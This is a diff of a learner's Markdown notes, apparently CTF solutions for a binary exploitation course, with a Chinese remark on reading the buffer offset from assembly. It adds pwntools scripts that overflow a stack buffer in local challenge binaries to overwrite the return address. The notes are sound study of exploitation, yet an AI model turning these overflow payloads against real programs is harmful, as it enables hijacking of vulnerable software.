@@ -15,6 +15,14 @@ print(io.recvall().decode())
 
 ```
 ### .1
+准确的buf相对rbp的偏移要看汇编
+```s
+lea     rax, [rbp+var_30]
+mov     [rbp+buf], rax
+# ...
+mov     rax, [rbp+buf]
+mov     rsi, rax
+```
 ```py
 
 from pwn import *
@@ -34,39 +42,41 @@ print(io.recvall().decode())
 ### .0
 ```py
 
-```
-### .1
-```py
+from pwn import *
+context(os='linux',arch='amd64')
+elfpath=os.path.join('/challenge',os.listdir('/challenge')[0])
+# elfpath=os.path.join('/home/hacker/challenge',os.listdir('/challenge')[0])
+io=process(elfpath)
 
-```
-## 6
-### .0
-```py
+io.sendline('65536')
+io.sendline('65536')
 
-```
-### .1
-```py
+pl=b'b'*(152)+p64(0x401c4b)
 
-```
-## 7
-### .0
-```py
+io.send(pl)
+print(io.recvall().decode())
 
 ```
 ### .1
 ```py
 
-```
-## 8
-### .0
-```py
+from pwn import *
+context(os='linux',arch='amd64')
+elfpath=os.path.join('/challenge',os.listdir('/challenge')[0])
+# elfpath=os.path.join('/home/hacker/challenge',os.listdir('/challenge')[0])
+io=process(elfpath)
 
-```
-### .1
-```py
+io.sendline('65536')
+io.sendline('65536')
+
+pl=b'b'*(0x80+8)+p64(0x4020D4)
+
+io.send(pl)
+print(io.recvall().decode())
 
 ```
 ## 9
+???怎么直接9了
 ### .0
 ```py
 
